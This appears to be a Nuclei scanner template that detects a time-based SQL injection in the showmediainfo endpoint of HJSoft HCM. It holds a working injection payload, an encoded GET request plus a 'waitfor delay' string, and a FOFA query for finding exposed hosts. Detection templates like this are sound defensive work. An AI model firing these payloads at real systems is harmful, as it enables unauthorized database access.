id: hjsoft-hcm-showmediainfo-sqli

info:
  name: HJSoft HCM showmediainfo - SQL Injection
  author: Co5mos
  severity: high
  description: |
    Detects SQL Injection vulnerability in Hjsoft eHR showmediainfo.
    java -jar HrmsTool.jar -e "1';waitfor delay '0:0:5'--"
  reference:
    - https://github.com/wy876/POC/commit/eda99ffdb2dc52a9536b5c291722bbe5279fcfcb
    - https://github.com/vaycore/HrmsTool/releases/tag/0.1
  metadata:
    fofa-query: app="HJSOFT-HCM"
  tags: HJSoft-HCM

http:
  - raw:
      - |
        @timeout: 10s
        GET /workbench/duty/showmediainfo?kind=0&usernumber=1MV8sCtnMcsZFzLhJXUMPAATTP2HJFPAATTPVIRoUrFdir1XVNthrak35kPAATTP3HJDPAATTP&planid=1&objectid=1 HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "duration>=5"
      - type: word
        part: header
        words:
          - "JESSESSID="
          - "Content-Length: 0"
      - type: status
        status:
          - 200